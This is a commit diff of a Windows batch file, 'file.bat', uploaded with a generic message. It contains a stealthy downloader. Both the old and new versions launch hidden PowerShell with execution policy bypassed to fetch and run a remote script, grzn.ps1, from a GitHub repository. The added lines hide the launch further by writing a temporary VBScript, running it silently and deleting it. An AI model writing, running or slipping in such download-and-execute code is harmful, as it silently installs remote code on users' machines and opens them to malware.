63fce0a3726fda04e9b764a064286eb0fb439771
engine34r <ppooker@tutamail.com>
2025-09-01 09:32:24 +0000

    Add files via upload

--- file.bat
+++ file.bat
@@ -1,6 +1,12 @@
 @echo off
 setlocal
 
-powershell -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -c "iex (iwr 'https://raw.githubusercontent.com/engine34r/knocker/main/grzn.ps1' -UseBasicParsing).Content"
+echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\runhidden.vbs"
+echo WshShell.Run "powershell -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command ""iex (iwr 'https://raw.githubusercontent.com/engine34r/knocker/main/grzn.ps1' -UseBasicParsing).Content""", 0, False >> "%temp%\runhidden.vbs"
+
+cscript //nologo "%temp%\runhidden.vbs"
+
+del "%temp%\runhidden.vbs" >nul 2>&1
 
 endlocal
+exit
